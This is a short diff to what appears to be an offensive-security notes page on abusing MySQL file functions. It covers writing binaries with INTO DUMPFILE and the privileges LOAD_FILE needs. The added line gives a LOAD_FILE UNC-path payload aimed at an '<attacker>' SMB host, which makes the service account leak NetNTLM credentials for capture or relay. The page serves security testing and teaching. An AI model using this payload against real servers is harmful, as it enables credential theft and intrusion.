@@ -44,6 +44,7 @@ SELECT @@secure_file_priv;
 - Use **`INTO DUMPFILE`** (not `OUTFILE`) for binaries: `OUTFILE` escapes and adds separators, corrupting a `.so`/`.dll`; `DUMPFILE` writes bytes verbatim.
 - `LOAD_FILE` returns NULL when the file is unreadable by the service account or blocked by `secure_file_priv`, so check that setting first.
 - These require the `FILE` privilege, which `root` has by default; a lower user may not, so confirm with `SHOW GRANTS`.
+- On **Windows** MySQL, `LOAD_FILE('\\\\<attacker>\\x')` makes the service account authenticate to an SMB listener, a NetNTLM [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) or [relay](../../directory/active-directory/authentication/ntlm/relay.md) primitive; uncommon, since MySQL on Windows is rare.
 
 ## Tools
 
